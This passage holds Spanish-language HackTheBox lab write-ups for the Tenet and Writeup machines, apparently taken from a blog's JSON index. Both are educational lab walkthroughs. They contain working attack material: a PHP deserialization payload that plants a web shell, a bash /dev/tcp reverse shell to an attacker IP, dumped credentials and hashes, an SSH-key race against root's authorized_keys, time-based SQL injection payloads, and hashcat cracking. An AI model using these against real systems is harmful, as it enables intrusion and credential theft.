:2:{s:9: user_file ;s:16: ajaTEncontre. php ;s:4: data ;s:23: %3C%3Fphp%20echo%20%27holaa%3F%27%3B%20%3F%3E ;} Bingo PAAAAAAAAAAAA, ahora probemos a insertar algo que nos permita ejecutar comandos en el sistema: /sator. php?arepo=O:14: DatabaseExport :2:{s:9: user_file ;s:16: ajaTEncontre. php ;s:4: data ;s:58: &lt;?php $command=shell_exec($_GET['xmd']); echo $command; ?&gt; ;}Encode URL: /sator. php?arepo=O:14: DatabaseExport :2:{s:9: user_file ;s:16: ajaTEncontre. php ;s:4: data ;s:58: %3C%3Fphp%20%24command%3Dshell_exec%28%24_GET%5B%27xmd%27%5D%29%3B%20echo%20%24command%3B%20%3F%3E ;}Comprobemos: Listos, tenemos ejecuci√≥n remota de comandos en el sistema. Intentemos entablar una reverse Shell, primero nos ponemos en escucha: ‚Äì¬ª nc -lvp 4433listening on [any] 4433 . . . Ahora hacemos la petici√≥n: /ajaTEncontre. php?xml=bash -c  bash -i &gt;&amp; /dev/tcp/10. 10. 14. 226/4433 0&gt;&amp;1 URL Encode: /ajaTEncontre. php?xml=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10. 10. 14. 226%2F4433%200%3E%261%22Yyy obtenemos nuestra Shell: PERFECTOOOOOOOOOOO, que vaina linda ehh!! ‚õ∑Ô∏è ‚Ä¶  Script para ejecutar cualquier comando en la m√°quina mediante la deserializaci√≥n insegura. ‚Ä¶ Bueno, hagamos tratamiento de la TTY y sigamos‚Ä¶  S4vitar nos explica lo que debemos hacer para conseguir una Shell completamente interactiva (tratamiento de la TTY). ‚Ä¶ Tenemos solo un usuario y es el que contiene la bandera del user. txt: www-data@tenet:/var/www/html$ ls /home/neilwww-data@tenet:/var/www/html$ ls /home/neil/user. txtwww-data@tenet:/var/www/html$ cat /home/neil/user. txt cat: /home/neil/user. txt: Permission deniedwww-data@tenet:/var/www/html$Enumerando con linpeas. sh vemos unas credenciales del usuario neil hacia una base de datos y que www-data puede ejecutar ese archivo como usuario root: . . . [+] Searching Wordpress wp-config. php fileswp-config. php files found:/var/www/html/wordpress/wp-config. phpdefine( 'DB_NAME', 'wordpress' );define( 'DB_USER', 'neil' );define( 'DB_PASSWORD', 'Opera2112' );define( 'DB_HOST', 'localhost' );. . . . . . . . . User www-data may run the following commands on tenet:¬∑  (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH. sh. . . Si validamos que servicios est√° corriendo localmente vemos la base de datos: www-data@tenet:/dev/shm$ netstat -lActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address      Foreign Address     Statetcp    0   0 localhost:domain    0. 0. 0. 0:*        LISTENtcp    0   0 0. 0. 0. 0:ssh       0. 0. 0. 0:*        LISTENtcp    0   0 localhost. localdo:mysql 0. 0. 0. 0:*        LISTENtcp6    0   0 [::]:ssh        [::]:*         LISTENtcp6    0   0 [::]:http        [::]:*         LISTENudp    0   0 localhost:domain    0. 0. 0. 0:*Active UNIX domain sockets (only servers)Proto RefCnt Flags    Type    State     I-Node  Pathunix 2   [ ACC ]   SEQPACKET LISTENING   14311  /run/udev/control. . .  mysql -&gt; neil:Opera2112. Entonces probemos: www-data@tenet:/dev/shm$ mysql -u neil -pEnter password: Welcome to the MySQL monitor.  Commands end with ; or \g. Your MySQL connection id is 7Server version: 5. 7. 32-0ubuntu0. 18. 04. 1 (Ubuntu)Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners. Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. mysql&gt; Perfe, pues enumeremos la base de datos: mysql&gt; show databases;+--------------------+| Database      |+--------------------+| information_schema || mysql       || performance_schema || sys        || wordpress     |+--------------------+5 rows in set (0. 00 sec)mysql&gt; use wordpress;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+-----------------------+| Tables_in_wordpress  |+-----------------------+| wp_commentmeta    || wp_comments      || wp_links       || wp_options      || wp_postmeta      || wp_posts       || wp_term_relationships || wp_term_taxonomy   || wp_termmeta      || wp_terms       || wp_usermeta      || wp_users       |+-----------------------+12 rows in set (0. 00 sec)mysql&gt; Veamos la tabla wp_users: mysql&gt; SELECT * FROM wp_users;+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+| ID | user_login | user_pass             | user_nicename | user_email      | user_url           | user_registered   | user_activation_key | user_status | display_name |+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+| 1 | protagonist | $P$BqNNfN07OWdaEfHmGwufBs. b. BebvZ. | protagonist  | protagonist@tenet. htb | http://10. 10. 10. 44/wordpress | 2020-12-16 12:17:10 |           |      0 | protagonist || 2 | neil    | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | neil     | neil@tenet. htb    | http://tenet. htb       | 2020-12-16 14:51:26 |           |      0 | neil neil  |+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+2 rows in set (0. 00 sec)mysql&gt; Tenemos dos hashes, para validar que tipo son, nos apoyamos de los ejemplos que tiene hashcat.  Los hashes son tipo phpass, WordPress (MD5), Joomla (MD5). Veamos si los podemos crackear con rockyou. txt: PEEEEEEEEEEEERO ANTES, intentemos ingresar con la cuenta neil y la contrase√±a Opera2112 a su sesi√≥n en la m√°quina, por probar, antes de quemar nuestra RAM (: www-data@tenet:/var/www/html$ su neilPassword: neil@tenet:/var/www/html$ cd neil@tenet:~$ iduid=1001(neil) gid=1001(neil) groups=1001(neil)neil@tenet:~$ Pues si, para evitar quemarnos la cabeza con otros temas :P (Ya me ha pasado en varias m√°quinas). ‚Ä¶ Escalada de privilegios #: Ac√° entra en juego el archivo que encontramos mediante linpeas. sh: neil@tenet:~$ sudo -lMatching Defaults entries for neil on tenet:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:User neil may run the following commands on tenet:  (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH. shneil@tenet:~$ Podemos ejecutar el script como usuario administrador del sistema empleando sudo, solo que ahora con neil. Veamos su contenido: #!/bin/bashcheckAdded() {    sshName=$(/bin/echo $key | /usr/bin/cut -d     -f 3)    if [[ ! -z $(/bin/grep $sshName /root/. ssh/authorized_keys) ]]; then        /bin/echo  Successfully added $sshName to authorized_keys file!     else        /bin/echo  Error in adding $sshName to authorized_keys file!     fi}checkFile() {    if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then        /bin/echo  Error in creating key file!         if [[ -f $1 ]]; then /bin/rm $1; fi        exit 1    fi}addKey() {    tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)    (umask 110; touch $tmpName)    /bin/echo $key &gt;&gt;$tmpName    checkFile $tmpName    /bin/cat $tmpName &gt;&gt;/root/. ssh/authorized_keys    /bin/rm $tmpName}key= ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu addKeycheckAddedBien, tenemos:  Crea un archivo en /tmp con nombre ssh-* (el * significa que puede ser cualquier nombre), despues almacena el valor de la variable $key (que en este caso tiene la llave p√∫blica del usuario root de la m√°quina) en ese archivo temporal, verifica que el archivo se haya creado y tenga contenido, si hay error lo borra. (Mira estos recursos sobre declaraciones en IF bash).  Ahora toma el contenido del archivo y lo agrega al objeto /root/. ssh/authorized_keys; esto con el fin de no tener que ingresar contrase√±a en el caso del usuario root@ubuntu con esa llave p√∫blica y la llave privada relacionada. (M√°s info ac√° y tambi√©n ac√° sobre el archivo /. ssh/authorized_keys. ) Borra el archivo temporal y v√°lida que efectivamente se haya agregado la llave. Listos, ya que sabemos que hace el script y porque lo hace, podemos aprovecharnos de esto de una manera muy sencilla. Sabemos que se crean archivos temporales cada vez que ejecutamos el script, pero que a la vez se borran superr√°pido. Entonces podemos armarnos otro script en el que le pasemos nuestra llave publica a cualquier archivo que est√© creado sobre la carpeta /tmp y que empiece con el nombre ssh-. Esto para poder simplemente ingresar a la m√°quina sin necesitar contrase√±a. Ya que le estamos diciendo que nos guarde nuestra identidad p√∫blica en su m√°quina y como en este caso lo guarda en la ruta del usuario administrador, podr√≠amos ingresar como root.  SSH Keys - archlinux. orgPrimero veamos como generar nuestras llaves: ‚Äì¬ª ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/. ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /. ssh/id_rsaYour public key has been saved in /. ssh/id_rsa. pubThe key fingerprint is:SHA256:LWUMikKpuLYON5XF4vAcInU0kG4YR72yxCWpuLs9urg lanz@lanzThe key's randomart image is:+---[RSA 3072]----+| . *B*  .     || o+= * . o    ||+oB * =  +   ||=+ @ *  +    ||. o. O  S .    ||o. o   .    ||o. +       ||++. .       ||E*. .       |+----[SHA256]-----+¬∑ ~/. ssh ¬∑‚Äì¬ª lsid_rsa id_rsa. pubPerfecto, nos genera las 2 llaves, una p√∫blica y otra privada.  Las llaves de SSH siempre son generadas en pares con una llamada llave privada y otra llamada llave p√∫blica. La llave privada solo es conocida por el usuario y debe ser guardada con cuidado. En contraste, la llave p√∫blica puede ser compartida libremente con cualquier servidor SSH con el que se quiere conectar. ArchLinux. org Nosotros necesitaremos la llave p√∫blica, porque como cit√© anteriormente: ‚Äúla llave p√∫blica puede ser compartida libremente con cualquier servidor SSH con el que se quiere conectar‚Äù Ahora creemos el script, lo llamar√© rounded. sh: #!/bin/bashkeyy= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCo9T2TnGWh+/2D876RYO1Wd08WkOJGFSL1oSu/loc0Khb0U/Ou8gwj8+NyFq0E5SuPIWHDtogg00/KOrzmFLwMza+oN5HumhHBeNgJvF4IxU3LmHciLWjHpCDXQvJf1FmazIVGuvXlNEuuEHV2TBO2R8H+2jO4GHVHB57dFci87StQoPU9V8fs0NXnieCkOvFH3gESWlbeDj8h0O7mYpjvdGNFgbvlpvKe3zhxrB9al5CPYFcMy4Zv0TXT+tRYjU1jKUJX8WaxNzDDdKhnp68N5BuDMlxkyNdRSlQUQIJcfglRdubLOre4r7SYpNBhWUI6IowMHvDXcw7+zGmtqAUqTjsm0whlRrNxGlsEHdLUA/EPu+wlcVlk9f9uGugTE7LTJxbYXPe96xc+xVL3T3Ciq6fz/aj0cBkIpwKsGLCyFKOceWrtrSu+f7KZCBODXMiKfxNF6wMZusDzN8VMWc6NY1SF0WE3UPcG+PNsBfQuIagiLXi40/lVOZoH7A7U1Xk= lanz@lanz while truedo echo $keyy | tee /tmp/ssh-*doneCon tee le indicamos que reemplace el contenido del archivo /tmp/ssh-LOQUESEA con lo que le pasemos, en este caso nuestra llave. Cuando lo haga nos mostrara el output. As√≠ que en vez de guardar la del usuario root@ubuntu guardar√≠a la de lanz@lanz. Veamos un ejemplo sencillo: ‚Äì¬ª cat pub_test ssh-rsa sssssssssssssssssssssssssdddddddddddddddddddddddddddddddddddd= jorge@root‚Äì¬ª echo  ssh-rsa ESTAESAHORALAllavePUBLICAqueVAM0S4AGREGARr= jorge?@sijorge  | tee pub_test ssh-rsa ESTAESAHORALAllavePUBLICAqueVAM0S4AGREGARr= jorge?@sijorge‚Äì¬ª cat pub_test ssh-rsa ESTAESAHORALAllavePUBLICAqueVAM0S4AGREGARr= jorge?@sijorgeListo, pues d√©mosle, subamos el script a la m√°quina: ‚Äì¬ª python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . neil@tenet:/dev/shm$ wget http://10. 10. 14. 226:8000/rounded. shneil@tenet:/dev/shm$ chmod +x rounded. sh neil@tenet:/dev/shm$ ls -latotal 4drwxrwxrwt 2 root root  60 Jan 19 18:07 . drwxr-xr-x 17 root root 3780 Jan 19 14:51 . . -rwxrwxr-x 1 neil neil 633 Jan 19 17:42 rounded. shneil@tenet:/dev/shm$ . /rounded. sh. . . Debemos ser r√°pidos, ya que borra el archivo casi inmediatamente‚Ä¶ Pero bueno, ya lo tenemos en la m√°quina, aprovechemos que tenemos la contrase√±a del usuario neil para entrar mediante SSH a su sesi√≥n y desde ah√≠ ejecutar sudo /usr/local/bin/enableSSH. sh. ‚Äì¬ª ssh neil@10. 10. 10. 223neil@10. 10. 10. 223's password: Welcome to Ubuntu 18. 04. 5 LTS (GNU/Linux 4. 15. 0-129-generic x86_64). . . neil@tenet:~$ Para ejecutar el archivo continuamente a la vez que intentamos inyectarlo podemos hacer un one-liner empleando un ciclo for que corra 5000 veces :P neil@tenet:/dev/shm$ for i in {1. . 5000}; do sudo /usr/local/bin/enableSSH. sh; doneSuccessfully added root@ubuntu to authorized_keys file!Successfully added root@ubuntu to authorized_keys file!. . . Despues de probar y probar, vi que algo extra√±o estaba pasando en la sesi√≥n que conseguimos mediante la web, ya que no ten√≠amos el mismo output en ninguna sesi√≥n en cuanto a los archivos de la ruta /tmp: As√≠ que lo m√°s sencillo es quitarnos esa sesi√≥n y abrir otras con el usuario neil ya desde SSH :) ‚Ä¶ Ahora simplemente nos queda:  Ejecutar el script que agrega nuestra llave en una sesi√≥n, en otra ejecutamos el bucle for llamando al archivo /usr/local/bin/enableSSH. sh y finalmente probar nuestro acceso hacia la m√°quina, ser√≠a as√≠:‚Äì¬ª ssh root@10. 10. 10. 223 Y listos, tamos dentro de la m√°quina. Solo nos quedar√≠a ver las flags (: ‚Ä¶ La explotaci√≥n de objetos PHP me encanto, adem√°s de ser la primera vez que experimentaba con esa vulnerabilidad. El privesc fue m√°s un juego :S no me gusto tanto, pero pues la idea esta buena y creo que si alcanzo a imagin√°rmelo en alguna computadora por ah√≠ en el mundo :P Muchas gracias por pasarse por ac√° y leerse todo este conjunto de ideas, que tengas una feliz noche y a seguir rompiendo todooooooooooooooo. "
    }, {
    "id": 44,
    "url": "http://localhost:4000/htb/writeup",
    "title": "HackTheBox - Writeup",
    "body": "2021/06/09 - M√°quina Linux nivel f√°cil, nos miraremos a los ojos con un CMS vulnerable a SQLi time-based. Haremos reutilizaci√≥n de credenciales y encontraremos un PATH Hijacking guapet√≥n.  TL;DR (Spanish writeup): Creada por: jkr. Bueno vueno weno, vamos inicialmente a encontrarnos con el gestor de contenido (CMS) Made-Simple, relacionaremos una explotaci√≥n SQL basada en tiempo con el gestor, jugaremos y lograremos dumpear unas credenciales del usuario jkr. Tendremos en mente que las credenciales obtenidas solo son v√°lidas contra el CMS, pero haciendo reutilizaci√≥n de contrase√±as conseguimos una sesi√≥n en la m√°quina mediante SSH como el usuario jkr. Enumerando si existen tareas programadas, veremos que cuando un usuario ingresa por SSH se hace el llamado al programa run-parts, peeeeeeero es llamado como tal, sin ruta absoluta. Esto nos dar√° el impulso para pensar en un ataque tipo PATH Hijacking, teniendo esto en cuenta y que el usuario jkr est√° en el grupo staff lograremos obtener una reverse Shell como el usuario root. ‚Ä¶ Clasificaci√≥n de la m√°quina: Vulnerabilidades conocidas (probablemente por eso el nombre de la m√°quina) y va üßó ante el realismo.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ a e i o uuuuuuuuuuuuuuuuuuuuuuuuuu.  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Vamos a empezar escaneando los puertos con nmap, as√≠ podemos ir encontrando alguna ruta de explotaci√≥n/exploraci√≥n ante la m√°quina: ‚ù± nmap -p- --open -v 10. 10. 10. 138 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   Como resultado obtenemos: ‚ù± cat initScan# Nmap 7. 80 scan initiated Fri Jun 4 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 138# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 138 () Status: UpHost: 10. 10. 10. 138 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http/// Ignored State: filtered (65533)# Nmap done at Fri Jun 4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 276. 14 seconds      Puerto   Descripci√≥n         22   SSH       80   HTTP   ~(Para copiar los puertos directamente en la clipboard (aunque sean 2), hacemos uso de la funci√≥n referenciada antes ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 138  [*] Open ports: 22,80[*] Ports copied to clipboard)~ Ahora hacemos un escaneo de scripts y versiones de cada puerto encontrado, as√≠ hacemos m√°s directa nuestra investigaci√≥n: ‚ù± nmap -p 22,80 -sC -sV 10. 10. 10. 138 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Validamos: ‚ù± cat portScan# Nmap 7. 80 scan initiated Fri Jun 4 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10. 10. 10. 138Nmap scan report for 10. 10. 10. 138Host is up (0. 11s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 4p1 Debian 10+deb9u6 (protocol 2. 0)| ssh-hostkey: |  2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)|  256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)|_ 256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)80/tcp open http  Apache httpd 2. 4. 25 ((Debian))| http-robots. txt: 1 disallowed entry |_/writeup/|_http-title: Nothing here yet. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Fri Jun 4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 10. 67 secondsCositas relevantes:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 4p1 Debian 10+deb9u6       80   HTTP   Apache httpd 2. 4. 25 ((Debian))    El puerto 80 tiene una entrada ‚Äúescondida‚Äù llamada /writeup/. Empecemos a explorar a ver que encontramos‚Ä¶ ‚Ä¶ Puerto 80 ‚åñ: Podemos destacar varias cositas:  Donkey DoS.  jkr: Probable usuario de ‚Äúalgo‚Äù.  writeup. htb: Dominio a tener en cuenta. Veamos el recurso /writeup/:  Bien, simplemente tiene algunos ‚Äúwriteups‚Äù (fragmentos) de otras m√°quinas de la plataforma, pero nada relevante‚Ä¶ Jugando con Wappalyzer y whatweb vemos algo interesante: ‚ù± whatweb http://10. 10. 10. 138/writeupNos responde con 2 peticiones, una hacia /writeup y otra hacia /writeup/: http://10. 10. 10. 138/writeup [301 Moved Permanently] Apache[2. 4. 25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2. 4. 25 (Debian)], IP[10. 10. 10. 138], RedirectLocation[http://10. 10. 10. 138/writeup/], Title[301 Moved Permanently]Hacia /writeup/ est√° lo llamativo: http://10. 10. 10. 138/writeup/ [200 OK] Apache[2. 4. 25], CMS-Made-Simple, Cookies[CMSSESSID9d372ef93962], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2. 4. 25 (Debian)], IP[10. 10. 10. 138], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2019. All rights reserved. ], Title[Home - writeup]Un gestor de contenido llamado CMS-Made-Simple, no tenemos nada m√°s, pero al menos sabemos el software que esta detr√°s de la web (: Ahora podemos (como prueba de siempre) buscar algunos exploits relacionados con √©l y ver si nuestra web es vulnerable a ellos üï¥Ô∏è ‚Ä¶ Explotaci√≥n #: Haciendo una b√∫squeda r√°pida como: cms made simple exploit, nos encontramos uno llamativo:  CMS Made Simple &lt; 2. 2. 10 - SQL Injection.      CMS Made Simple up to 2. 2. 8 m1_idlist Time-Based SQLi.    Se trata de una inyecci√≥n SQL basada en tiempo, no se necesita autenticaci√≥n ni cosas extra. Las peticiones que hace, giran en torno a una en espec√≠fico, si esa no nos diera respuesta, este exploit no nos funcionar√≠a: . . . url_vuln = options. url + '/moduleinterface. php?mact=News,m1_,default,0'. . . Donde options. url ser√≠a la URL que le pasemos, en nuestro caso: http://10. 10. 10. 138/writeup. Si validamos esa petici√≥n en la web, obtenemos: Bien, nos responde, no hay nada interesante en el texto, peeeeeeeeeero hemos confirmado que existe esa URL, por lo tanto podemos probar ahora si el exploit funciona. Lo descargamos y ejecutamos: (Originalmente el exploit est√° hecho en **Python 2. x, pero tengo un problema con la librer√≠a requests en esa versi√≥n de Py, por suerte cambiando los print . . por print(. . ) nos permite ejecutar el programa con Python 3 sin problemas)** ‚ù± python3 cms_made_simple_SQLi. py [+] Specify an url target[+] Example usage (no cracking password): exploit. py -u http://target-uri[+] Example usage (with cracking password): exploit. py -u http://target-uri --crack -w /path-wordlist[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based. ‚ù± python3 cms_made_simple_SQLi. py -u http://10. 10. 10. 138/writeupY despues de un rato (al ser time-based, claramente es ‚Äúdemorado‚Äù) obtenemos esto con base en la informaci√≥n de la base de datos del CMS: Bien, nos extrae en concreto la data de un usuario llamado jkr en la base de datos usada por el CMS, ¬øpero como pasa esto?, bueno, enfoqu√©monos en como obtiene por ejemplo el valor salt de la password. üßø Entendemos la inyecci√≥n SQL basada en tiempo: En el script usa esta sentencia: . . . payload =  a,b,1,5))+and+(select+sleep(  + str(TIME) +  )+from+cms_siteprefs+where+sitepref_value+like+0x  + ord_salt_temp +  25+and+sitepref_name+like+0x736974656d61736b)+--+   . . . Y as√≠ viaja la petici√≥n: . . . url = url_vuln +  &amp;m1_idlist=  + payload. . . Si nos fijamos en el payload vemos varias cosillas: 1. a,b,1,5)): Es cuesti√≥n de jugar, entiendo que el que encontr√≥ la vulnerabilidad hizo eso, probar vaaaarias letras y n√∫meros y concatenarlo con alguna inyecci√≥n b√°sica y ver cu√°l le daba resultado, por ejemplo c,a,1)). . . tambi√©n funciona como payload. Siempre es cuesti√≥n de jugar y probar cosas‚Ä¶ 2. +: Los usa como ‚Äúencoders‚Äù de los espacios, ya que si ejecutamos la sentencia (en la web) sin esos ‚Äú+‚Äù, no se ejecuta la explotaci√≥n. 3. La parte interesante: ‚Ä¶ Si quisi√©ramos validar alg√∫n SQL blind time-based en este caso, ejecutando algo tan sencillo como: # Respuesta inmediata‚ù± time curl  http://10. 10. 10. 138/writeup/moduleinterface. php?mact=News,m1_,default,0&amp;m1_idlist=a,b,1,5 real  0m0,253suser  0m0,009ssys   0m0,003s. . . # 3 segundos de delay si hay ejecucion exitosa :)‚ù± time curl  http://10. 10. 10. 138/writeup/moduleinterface. php?mact=News,m1_,default,0&amp;m1_idlist=a,b,1,5))+and+sleep(3)+--+   . . . real  0m3,474suser  0m0,009ssys   0m0,008sY vemos los 3 segundos‚Ä¶ Ya con lo que juguemos despues del and es inyecci√≥n SQL (: ‚Ä¶ Ahora si e. e +and+(select+sleep(  + str(TIME) +  )+from+cms_siteprefs+where+sitepref_value+like+0x  + ord_salt_temp +  25+and+sitepref_name+like+0x736974656d61736b)+--+Donde le indica que seleccione (SELECT) algo, (si lo encuentra ejecuta sleep(1) (en el script TIME vale 1), o sea, hace un delay en la respuesta de un segundo (1)) de (FROM) la tabla cms_siteprefs donde (WHERE) el valor de la columna sitepref_value en este caso empiece con (leyendo sobre LIKE se entender√° el porqu√©, igual abajo lo digo) (LIKE . . . %) el valor de la variable ord_salt_temp:  Que toma el valor de cada letra con la que va iterando, ejemplo, prueba la a (¬øempieza por con a?), la b (¬øempieza con b?) y asi, eso va conformando ese valor, peeeeero no literalmente, lo pasa primero a decimal (valor ASCII del caracter) y despues a hexadecimal, ese si seria el resultado de la variable ord_salt_temp. Si algun caracter ejecuta el sleep, toma ese char y lo guarda para al final conformar (en este caso) el salt completo (:    ¬øempieza con a? si, guarda la a y ahora har√≠a: ¬øempieza con ab? si, y etc e. e  El valor del LIKE por ejemplo con la letra a quedar√≠a as√≠: . . . like 0x6125+and. . . `El 25 de hex a Ascii significa % (esto es sintaxis del propio LIKE). (Quiz√°s me explique fatal, pero es sencillo de entender una vez miras el script) Y finalmente le a√±ade a la b√∫squeda que el valor de la columna sitepref_name se parezca al valor hexadecimal 0x736974656d61736b (que significa sitemask en Ascii)‚Ä¶ Con esto es que se consigue la explotaci√≥n (: Ya va variando seg√∫n lo que se quiera conseguir :) ‚Ä¶ Validando en internet que tipo de hash es, corroboramos que es tipo MD5: Podemos agregarle el valor salt para terminar de confirmar que el formato del hash est√° bien: Listones, todo perfeeeeeeecto. Usando esta gu√≠a sobre ‚ÄúCracking Salted MD5 Hashes‚Äù, podemos empezar a jugar: Generamos un archivo que contenga el hash y la salt: ‚ù± cat madeSimple_jkr. hash 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807Y ahora con hashcat pasamos data en algunos par√°metros:       Par√°metro   Descripci√≥n         -m   Toma el tipo de hash con el que estamos tratando.        -a   Le indicamos el tipo de ataque que haremos, usaremos 0, as√≠ entender√° que es un dictionary-attack (para poder hacer uso de wordlists).        &lt;hashfile&gt;   Pos eso :P El archivo donde esta nuestro hash       &lt;wordlist&gt;   Y el archivo que usaremos como lista de palabras :)       -o   Para que nos guarde el resultado en el archivo que indiquemos.    Apoy√°ndonos en los ejemplos de hashes de hashcat logramos obtener el valor de -m: Dos opciones, probamos con las dos por si algo :P ‚ù± hashcat -m 10 -a 0 madeSimple_jkr. hash /usr/share/wordlists/rockyou. txt -o cracked_plain. txt. . . Status. . . . . . . . . . . : ExhaustedHash. Name. . . . . . . . : md5($pass. $salt). . . Con el tipo de hash 10 no obtenemos respuesta, probando con el 20: ‚ù± hashcat -m 20 -a 0 madeSimple_jkr. hash /usr/share/wordlists/rockyou. txt -o cracked_plain. txt. . . Status. . . . . . . . . . . : CrackedHash. Name. . . . . . . . : md5($salt. $pass). . . Opa, nos indica que fue crackeado, si validamos nuestro archivo cracked_plain. txt tenemos: ‚ù± cat cracked_plain. txt 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9En valor en texto plano de ese hash y el salt es: raykayjay9 üòµ Por lo tanto esa ser√≠a la contrase√±a del usuario jkr guardaba en la base de datos del CMS‚Ä¶ Pero ¬øY si validamos si existe alguna reutilizaci√≥n de contrase√±as por parte de jkr? Juguemos con el servicio SSH a ver si son v√°lidas: ‚ù± ssh jkr@10. 10. 10. 138jkr@10. 10. 10. 138's password:  Yyyyyyyyyyyyyyyyyyyyyyyy: Perfessssto, tamos dentroooooooooooooooooooooooooo! ‚Ä¶ Escalada de privilegios #: Viendo los grupos en los que est√° el usuario jkr, vemos uno distinto a los usuales: jkr@writeup:/$ iduid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)  El grupo staff‚Ä¶ Buscando vemos que le permite a los usuarios que lo poseen a√±adir (o modificar) informaci√≥n en las rutas /usr/local y /home sin necesidad de privilegios, adem√°s:  La ‚Äúhabilidad‚Äù de modificar /usr/local es equivalente a tener acceso como root, ya que /usr/local esta intencionalmente en cuanto a las rutas de busqueda antes de /usr. Users and groups - Debian. La cita hace referencia a la variable $PATH del sistema, algunos procesos usan esa variable para buscar fuentes o binarios. Ahorita hablaremos de esto. Estuve un tiempo jugando con ese grupo y un exploit que lo relacionaba, pero no logre nada de ah√≠. Est√° claro que para poder hacer algo con ese grupo y la ruta /usr/local necesitamos alg√∫n indicio de alguna tarea o ejecuci√≥n por parte del sistema y no por parte de jkr, ya que podemos escribir en la ruta /usr/local/bin, pero si lo ejecutamos, ser√° ejecutado como jkr :( Enumerando los procesos internos (con base en lo dicho anteriormente), buscando alguna tarea cron o ejecuci√≥n de la cual nos podamos aprovechar encontramos esto:  Usaremos pspy, que seg√∫n su propia descripcion nos pemite ver comandos ejecutados por otros usuarios, tareas programadas, etc. Lo bajamos a nuestra m√°quina (en nuestro caso comprobamos la arquitectura con el comando lscpu y vemos que estamos en una de 64 bits, as√≠ que descargamos ese tipo de binario). Despues lo pasamos a la m√°quina y ejecutamos: jkr@writeup:/tmp$ . /pspy64 Vemos una tarea programada, se ve que se ejecuta cada minuto y (seg√∫n las pruebas que hice con el rabbit hole anterior) borra el contenido de la ruta /usr/local/bin (puede que haga otras cosas :P). Pero no nos podemos aprovechar de ella, ya que no tenemos acceso a el script y tampoco podemos pensar en alg√∫n **Path Hijacking, ya que los comandos est√°n siendo llamados con su ruta absoluta :( Usando otra terminal estaba ejecutando procesos (ps, netstat, etc) para con ayuda de pspy ver si aparecia algo extra√±o, pasa que estaba ciego y no me habia fijado en ese ‚Äúalgo‚Äù :P Cuando se establece una sesi√≥n por medio del 